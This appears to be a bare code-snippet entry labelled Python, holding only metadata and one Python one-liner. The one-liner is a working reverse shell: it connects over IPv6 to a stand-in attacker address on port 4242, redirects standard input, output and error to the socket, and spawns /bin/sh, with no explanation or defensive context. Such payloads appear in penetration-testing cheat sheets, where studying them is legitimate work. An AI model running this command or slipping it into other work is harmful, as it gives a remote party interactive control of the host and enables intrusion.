---
id: ea580ee4-aa9b-4c2a-a027-a7abbed56aef
type: code
language: Python
verified: false
created_at: '2023-04-06T03:56:24.246612+00:00'
updated_at: '2023-04-10T20:25:25.998104+00:00'
---

# Code Snippet ea580ee4

**Language**: Python

```python
python -c 'a=__import__;c=a("socket");o=a("os").dup2;p=a("pty").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```
